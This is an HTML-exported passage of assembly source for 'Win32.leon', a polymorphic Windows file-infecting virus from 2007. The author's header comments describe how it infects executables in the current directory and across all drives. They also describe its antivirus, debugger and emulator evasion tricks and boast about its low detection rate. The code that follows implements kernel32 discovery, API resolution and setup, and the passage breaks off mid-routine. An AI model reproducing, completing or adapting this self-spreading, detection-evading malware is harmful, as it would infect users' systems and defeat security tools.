<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;FICHIER : main.asm</span><span class="sc0">
</span><span class="sc1">;NOM     : Win32.leon</span><span class="sc0">
</span><span class="sc1">;DATE    : 14/01/2007</span><span class="sc0">
</span><span class="sc1">;VERSION : 1.0</span><span class="sc0">
</span><span class="sc1">;AUTEUR  : kaze &lt;kaze@lyua.org&gt;</span><span class="sc0">
</span><span class="sc1">;SITE    : http://fat.next-touch.com</span><span class="sc0">



</span><span class="sc1">; I'm happy to introduce to you win32.leon, a nearly original poly virus. This virus is</span><span class="sc0">
</span><span class="sc1">; mainly focused on AV-detection evading, so don't expect ultral33t spreading. The main</span><span class="sc0">
</span><span class="sc1">; technique of this is virus is "decryption via APIS", i.e the decryptor is (with a</span><span class="sc0">
</span><span class="sc1">; probability of 4/5) 100% api based. Some random fake api calls are also used in the</span><span class="sc0">
</span><span class="sc1">; decryptor: those apis are called with random arguments, but won't disturb the virus's</span><span class="sc0">
</span><span class="sc1">; excecution: they just return an error code (except when being debugged where they</span><span class="sc0">
</span><span class="sc1">; sometimes throw exceptions). Random api calls are also used in the virus body in order</span><span class="sc0">
</span><span class="sc1">; to avoid dynamic detection.</span><span class="sc0">
</span><span class="sc1">; A lot of little tricks are also used to fool emulators and scanners (like encryption</span><span class="sc0">
</span><span class="sc1">; through relocations, or decryptor fragementation) and are explained in the article</span><span class="sc0">
</span><span class="sc1">; stored at http://fat.next-touch.com/data/win32.leon.pdf (french only for now).</span><span class="sc0">

</span><span class="sc1">;===== WIN32.LEON =========================================================================</span><span class="sc0">
</span><span class="sc1">; OS:           Win2000 and WinXP. Successfully tested on both. Won't work on vista because</span><span class="sc0">
</span><span class="sc1">;               of the fake apis thingie.</span><span class="sc0">
</span><span class="sc1">; TYPE:         PE Appender.</span><span class="sc0">
</span><span class="sc1">; TARGETS:      Kaze*.exe PE files, with .code &gt; ~10k and</span><span class="sc0">
</span><span class="sc1">;               vsize(lastsection)&lt;rawsize(lastsection)</span><span class="sc0">
</span><span class="sc1">; INFECTION:    Insert virus body into last section. The decryptor is cut into X part, where</span><span class="sc0">
</span><span class="sc1">;               X=number of api calls in the decryptor. Those parts are written in the .code</span><span class="sc0">
</span><span class="sc1">;               section at random locations. The first part is located on the EP. If the</span><span class="sc0">
</span><span class="sc1">;               decryptor used is api-based, the IAT of the host will also be modified by the</span><span class="sc0">
</span><span class="sc1">;               virus. If encryption via relocs is used, relocations are modified and the</span><span class="sc0">
</span><span class="sc1">;               host is relocated by the virus.</span><span class="sc0">
</span><span class="sc1">; SPREADING:    Infect current directory and all physical drives. Avoid infection of</span><span class="sc0">
</span><span class="sc1">;               SFC protected files.</span><span class="sc0">
</span><span class="sc1">; POLY/META:    Polymorphic, using a kpasm-generated poly engine (rules in regles.kpasm).</span><span class="sc0">
</span><span class="sc1">;               Use two decryptors (one at a time): a cryptoapis-based one and a simple</span><span class="sc0">
</span><span class="sc1">;               xor loop.</span><span class="sc0">
</span><span class="sc1">; ANTIDBG:      Yes. The decryptor and the virus body use a lot of "fake apis", i.e some</span><span class="sc0">
</span><span class="sc1">;               apis with random arguments, that's won't do anything normally, but will</span><span class="sc0">
</span><span class="sc1">;               throw some exception when debugged.</span><span class="sc0">
</span><span class="sc1">; ANTIEMUL:     Yes. The decryptor is mainly composed of api calls. Most of the emulators</span><span class="sc0">
</span><span class="sc1">;               don't emulate them all. Bogus api calls are also used (fake apis) in order</span><span class="sc0">
</span><span class="sc1">;               to fool the emulator. The control flow in the decryptor is also a bit</span><span class="sc0">
</span><span class="sc1">;               obfuscated: in order to jump from the K part to the K+1 part</span><span class="sc0">
</span><span class="sc1">;               (in the decryptor), the emulator has to know the exact number of arguments</span><span class="sc0">
</span><span class="sc1">;               of the api used in the K part. Up to 500 different fake apis could be used.</span><span class="sc0">
</span><span class="sc1">; ANTISCAN:     Yes. Besides the poly, the virus sometimes uses encryption via</span><span class="sc0">
</span><span class="sc1">;               relocations: the decryptor itself is encrypted by having some relocations</span><span class="sc0">
</span><span class="sc1">;               pointing to the decryptor's code. The imagebase is modified to force windows</span><span class="sc0">
</span><span class="sc1">;               to relocate the infected host (and so decrypt the decryptor). Relocations</span><span class="sc0">
</span><span class="sc1">;               of the host are nulled and the host itsef is relocated by the virus.</span><span class="sc0">
</span><span class="sc1">; ANTIDYNAMIC:  Yes. The sequence of the apis used by the virus body and the decryptor is</span><span class="sc0">
</span><span class="sc1">;               random. Each virus api call is surrounded by up to 10 random fake apis calls.</span><span class="sc0">
</span><span class="sc1">; ANTIHEURIST:  No. It may fool some but no original trick used.</span><span class="sc0">
</span><span class="sc1">; BUGS:         Will crash every ~50 infections (don't ask me why). When crashing, the virus</span><span class="sc0">
</span><span class="sc1">;               try to restore control to infected program through SEH.</span><span class="sc0">
</span><span class="sc1">;==========================================================================================</span><span class="sc0">

</span><span class="sc1">; Well, this virus has been finished in hurry, so some things could be improved. The poly</span><span class="sc0">
</span><span class="sc1">; engine for example is good, but could be easily improved. The payload also is a simple</span><span class="sc0">
</span><span class="sc1">; MessageBox: I coded a nice one (some animated monkey playing around with desktop's icons :),</span><span class="sc0">
</span><span class="sc1">; but hadn't time to integrate it into the virus. Just look at the web site for the payload,</span><span class="sc0">
</span><span class="sc1">; it's quite fun :D. I sent it to AVers three weeks ago, and only 3 detect it, but with a bad</span><span class="sc0">
</span><span class="sc1">; ratio (&lt;70%). I think that's because they just don't care, it's a PoC after all. Well,</span><span class="sc0">
</span><span class="sc1">; i'll publish it anyway.</span><span class="sc0">

</span><span class="sc1">; Thankz to:</span><span class="sc0">
</span><span class="sc1">;   - Baboon for the help with kpasm debugging</span><span class="sc0">
</span><span class="sc1">;   - Poco for hosting this file</span><span class="sc0">
</span><span class="sc1">;   - Squallsurf for the Vista VM</span><span class="sc0">
</span><span class="sc1">;   - Silma for the motivation.</span><span class="sc0">
</span><span class="sc1">;   - Tuna for the reading &amp; correction of the paper</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;And Greetz to all #fat,#nas and #uct members</span><span class="sc0">

</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">STDCALL</span><span class="sc0">

</span><span class="sc1">;===================================== MACROS =================================</span><span class="sc0">

</span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sauve_reg_anti_call</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sauve_reg_anti_call2</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">anti_call</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sauve_reg_anti_call</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sauve_reg_anti_call2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">call_s</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">


</span><span class="sc5">debug</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">x</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printdec</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">debuga</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">MessageBox</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc1">;======================================= EQUS =================================</span><span class="sc0">

</span><span class="sc5">TAILLE_IMPORTS</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">8092</span><span class="sc0">    </span><span class="sc1">;devrait suffire pour la plupart des hôtes (env 50 dlls)</span><span class="sc0">
                                    </span><span class="sc1">;doit etre alignee sur 4k!</span><span class="sc0">
</span><span class="sc5">TAILLE_API</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0">
</span><span class="sc5">NB_DLLS_IMPORTEES</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">FIRST_GEN_IMAGE_BASE</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">
</span><span class="sc5">DECRYPTOR_SIZE</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">;decrypteur polymorphisé</span><span class="sc0">
</span><span class="sc5">MUTATED_DECRYPTOR_SIZE</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0">      </span><span class="sc1">;pseudo-code modifié</span><span class="sc0">
</span><span class="sc5">VIRTUAL_SIZE_VIRUS</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(((</span><span class="sc5">virus_len</span><span class="sc4">+</span><span class="sc5">heap_len</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TAILLE_IMPORTS</span><span class="sc4">)/</span><span class="sc2">4096</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4096</span><span class="sc4">+</span><span class="sc5">DECRYPTOR_SIZE</span><span class="sc0">
</span><span class="sc5">MAX_NB_PARTIES</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">        </span><span class="sc1">;nombre max de parties pour le décrypteur</span><span class="sc0">
</span><span class="sc5">PARTIE_MAX_SIZE</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">DECRYPTOR_SIZE</span><span class="sc4">/</span><span class="sc5">MAX_NB_PARTIES</span><span class="sc0">
</span><span class="sc5">MAX_OPCODE_PAR_PARTIE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">        </span><span class="sc1">;sic</span><span class="sc0">
</span><span class="sc5">OPCODE_MAX_SIZE</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">PARTIE_MAX_SIZE</span><span class="sc4">/</span><span class="sc5">MAX_OPCODE_PAR_PARTIE</span><span class="sc0">
</span><span class="sc5">NB_CASES_MEMOIRE</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">       </span><span class="sc1">;nombre de cases mémoires à réserver pour le poly</span><span class="sc0">

</span><span class="sc5">PROV_RSA_FULL</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">CRYPT_NEWKEYSET</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">CRYPT_VERIFYCONTEXT</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0F0000000h</span><span class="sc0">
</span><span class="sc5">CALG_RC4</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">06801h</span><span class="sc0">
</span><span class="sc5">CALG_MD5</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">08003h</span><span class="sc0">
</span><span class="sc5">TAILLE_CLE</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">800000h</span><span class="sc0">

</span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc0">

</span><span class="sc5">SECTION_MASK</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0C0000040h</span><span class="sc0"> </span><span class="sc1">;0F0000060h</span><span class="sc0">
</span><span class="sc5">SLEEPTIME_ON_INFECT_DIR</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
</span><span class="sc5">MAX_ENDROITS_INTERDIT</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
</span><span class="sc5">MAX_RETRY</span><span class="sc0">               </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0">          </span><span class="sc1">;nombre max d'essais pour trouver des trous dans l'hote</span><span class="sc0">

</span><span class="sc1">;!! MAX_APIS_IMPORTEES*TAILLE_API*2 &lt; TAILLE_IMPORTS/2</span><span class="sc0">
</span><span class="sc5">MAX_APIS_IMPORTEES</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">MAX_REAL_APIS_IMPORTEES</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MAX_FAKE_APIS_IMPORTEES</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">MAX_REAL_APIS_IMPORTEES</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">MAX_FAKE_APIS_IMPORTEES</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">

</span><span class="sc5">SIGNATURE_VIRUS</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">54</span><span class="sc0">

</span><span class="sc5">PROB_DECRYPTEUR_SIMPLE</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">

</span><span class="sc5">PROBA_ENCRYPTION_RELOCS</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">NB_RELOCS_PAR_ILOT</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc0">  </span><span class="sc1">;multiple de 32bits !</span><span class="sc0">
</span><span class="sc5">IMAGEBASE_DEFAUT</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">10000h</span><span class="sc0">

</span><span class="sc1">;==================================== FIRST GEN DATA ==========================</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">


</span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">Signature</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Win32.Leon   coded by kaze"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;======================================= CODE =================================</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">debut_virus</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;======================================= CORPS ================================</span><span class="sc0">
</span><span class="sc5">encrypt_cryptoapised_stuff</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">

</span><span class="sc1">; sauvegarde quelques variables</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_sauvegarder</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sauvegarde</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">taille_sauvegarde</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">


</span><span class="sc1">;reequilibrage de la pile</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">nb_fake_pushs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; cherche l'adresse de kernel32</span><span class="sc0">
</span><span class="sc5">find_kernel</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0F000h</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seh</span><span class="sc0">
</span><span class="sc5">seh_handler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">find_it</span><span class="sc0">
</span><span class="sc5">seh</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc5">find_it</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">k32_not_found</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">find_it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">find_it</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;récupère les apis de k32</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">liste_apis_k32</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;apis de k32</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">apis_k32</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">find_apis</span><span class="sc0">


</span><span class="sc1">;met en place le seh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seh_virus</span><span class="sc0">
</span><span class="sc5">seh_handler_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta3</span><span class="sc0">
</span><span class="sc5">delta3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta3</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retour_hote</span><span class="sc0">
</span><span class="sc5">seh_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">


</span><span class="sc1">;alloue la memoire</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_allouer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">variables_allouees</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">nb_a_allouer</span><span class="sc0">
</span><span class="sc5">l_alloue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">call_s</span><span class="sc0"> </span><span class="sc5">LocalAlloc</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">retour_hote</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">l_alloue</span><span class="sc0">

</span><span class="sc1">;obligatoire pour les fake apis dynamiques</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">anti_call_init</span><span class="sc0">

</span><span class="sc1">;recupere l'adresse des autres apis</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">name_user32</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;apis de user32</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">LoadLibrary</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">liste_apis_u32</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">apis_u32</span><span class="sc4">]</span><span class="sc0">
